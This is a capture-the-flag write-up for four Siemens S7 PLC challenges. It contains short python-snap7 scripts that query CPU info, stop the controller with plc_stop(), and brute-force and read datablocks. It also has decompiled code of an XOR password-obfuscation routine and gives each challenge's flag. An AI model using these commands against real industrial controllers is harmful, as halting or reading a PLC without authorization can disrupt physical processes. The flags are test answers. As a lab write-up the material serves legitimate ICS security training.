# Siemens S7 related Write-Ups 
<p aling="justify">This folder contains WUs for all the challenges related to Siemens S7 programmable logic controller. Challenges included are:</p>

- Who Am I ?
- Stop This PLC
- A Hidden Value
- Old Proprietary Encryption

## Who Am I 
<p aling="justify">This challenge was a Network challenge in which the goal was to interact with Siemens PLC. To do so python provides libraries such as snap7 which embeds a client constructor to interact with a PLC. The code below questions the PLC about hardware components (CPU ...):</p>

````python3
import snap7
client = snap7.client.Client()
client.connect(PLC_IP, PLC_RACK, PLC_SLOT, PLC_PORT)
print(client.get_cpu_info())
````

FLAG : _ECW{FRLCUR289}_, thanks _DGA_ for this challenge ! 

---

## Stop This PLC

<p aling="justify">In this challenge the idea was to stop the PLC. To do so snap7 libraries provides plc_stop() method:</p>

````python3
import snap7
client = snap7.client.Client()
client.connect(PLC_IP, PLC_RACK, PLC_SLOT, PLC_PORT)
client.plc_stop()
````
<p aling="justify">After the PLC was successfuly stopped, we must look at network traffic to see the packet containing the flag being sent :</p>
<p align="center"><img src="./Screenshots/flagPLCs72.png"></p>

FLAG : _ECW{S7-315-stop}_ , Thanks _DGA_ for this challenge !

---

## A Hidden Value

<p aling="justify">In this challenge the idea was to read memory Datablocks on the PLC. Datablocks can be seen as raw byte arrays stored on the PLC, identified by a datablock number, and persistent. Those datablocks are used by software  and mostly contain informations about modules ... Those datablocks can be freely setup, and here store the flag. To solve this challenge, the first step is to undertsand on which datablocks the flag is stored. The snap7 library provides a method to read (or try to read) the content of the datablock:</p>

````python3
client.db_read(DATABLOCK_ID, DATABLOCK_START_OFFSET, DATABLOCK_LENGTH)
````
<p aling="justify">Where: </p>

- _DATABLOCK_ID_ is the DB number
- _DATABLOCK_START_OFFSET_ is the offset in memory from which the data will be read, here 0

````python3
import snap7
client = snap7.client.Client()
client.connect(PLC_IP, PLC_RACK, PLC_SLOT, PLC_PORT)

#guess the data block number in memory
for i in range(5000):
	try:
            data = client.db_read(i, 0, 200)
            print(f"[+] Read DB {i}, size of block 200: {data[:16]}...")
            break
        except Exception as e:
            print(f"[X] Error on DB {i}, size of block {j}: {e}")

client.disconnect()
````


````python3
import snap7
client = snap7.client.Client()
client.connect(PLC_IP, PLC_RACK, PLC_SLOT, PLC_PORT)
dbn, size = 6485, 200 #220 => enough to read the flag
buffer = client.db_read(dbn, 0, size)
print(buffer)
````

FLAG : _ECW{Variable-Flag-159}_ , Thanks _DGA_ for this challenge !

---

## Old Proprietary Encryption

````Cpp
int __stdcall sub_1000551B4(char a1, void *Dst)
{
  const void *v2; // eax
  _WORD *v4; // [esp+8h] [ebp-1Ch]
  _WORD *v5; // [esp+Ch] [ebp-18h]
  signed int i; // [esp+14h] [ebp-10h]
	
  if ( !sub_1000D480(&a1) )
    CString::operator=(&a1, off_1009C50C);
  while ( sub_1000D8480(&a1) < 8 )
    CString::operator+=(&a1, 32);
  v2 = (const void *)unknown_libname_203(&a1);
  memcpy(Dst, v2, 8u);
  v4 = Dst;
  v5 = Dst;
  *(_WORD *)Dst ^= 0xAAAAu;
  for ( i = 1; i < 4; ++i )
  {
    ++v4;
    *v4 ^= *v5 ^ 0xAAAA;
    ++v5;
  }
  return CString::~CString((CString *)&a1);
}
````

Flag : _ECW{plcFLM12}_, thanks _DGA_ for this challenge ! 
